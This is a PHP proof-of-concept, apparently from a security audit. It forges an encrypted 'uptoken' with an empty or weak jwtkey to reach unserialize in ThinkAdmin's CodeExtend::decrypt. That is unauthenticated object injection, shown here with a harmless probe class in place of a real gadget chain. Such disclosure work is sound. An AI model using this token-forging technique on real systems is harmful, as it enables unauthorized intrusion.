<?php
// A2 PoC：可预测/空 data.jwtkey ⇒ CodeExtend::decrypt 触发 unserialize（PHP 对象注入原语）
// 用法（在仓库根目录）: php docker-poc/poc_deser.php
require __DIR__ . '/../vendor/autoload.php';

use think\admin\extend\CodeExtend;

// 探针类：模拟 POP gadget 的魔术方法触发点（真实利用需换成 vendor 中的 gadget 链）
class PocProbe
{
    public $marker = 'unserialize-reached';
    public function __wakeup() { echo "    [GADGET] __wakeup() fired; marker={$this->marker}\n"; }
    public function __destruct() { echo "    [GADGET] __destruct() fired\n"; }
}

foreach (['' => '空密钥(全新未配置实例)', '0123456789abcdef0123456789abcdef' => '可预测/弱密钥'] as $key => $label) {
    echo "==== 场景: {$label}  key='" . $key . "' ====\n";
    // 攻击者侧：用已知/空密钥构造 uptoken
    $forged = CodeExtend::encrypt(new PocProbe(), $key);
    echo "    伪造 uptoken = " . substr($forged, 0, 60) . "...\n";
    echo "    请求: GET /admin/api.plugs/script?uptoken=" . substr($forged, 0, 30) . "...\n";
    // 服务器侧：withUploadUnid() → CodeExtend::decrypt($uptoken, sysconf('data.jwtkey'))
    $obj = CodeExtend::decrypt($forged, $key);
    echo "    decrypt() 返回: " . (is_object($obj) ? get_class($obj) : gettype($obj)) . "\n\n";
}
echo "[结论] 攻击者完全控制 unserialize 的对象类型/属性（0-click，未认证）。\n";
